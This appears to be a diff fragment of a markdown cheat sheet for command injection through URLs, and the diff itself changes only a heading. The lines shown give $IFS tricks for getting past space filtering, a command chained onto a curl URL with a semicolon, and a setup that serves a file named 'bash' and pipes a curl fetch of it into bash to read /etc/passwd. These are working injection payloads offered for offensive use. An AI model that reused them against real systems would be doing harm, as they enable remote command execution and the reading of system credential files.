@@ -12,6 +12,6 @@ bypass url encoding for nontrivial shell commands and other copy-paste nightmare
 `wc$IFS-l$IFS<$IFS<(ls)`     
 #### starting code execution in a url without ampersand
 `curl http://localhost/;whoami`
-#### redirecting to a hidden exploit (localhost/bin/bash)
+#### redirecting to a hidden exploit  
 `mkdir bin;echo "cat /etc/passwd/" > bash; darkhttpd .`  
 `curl -s http://localhost/$0 | bash`
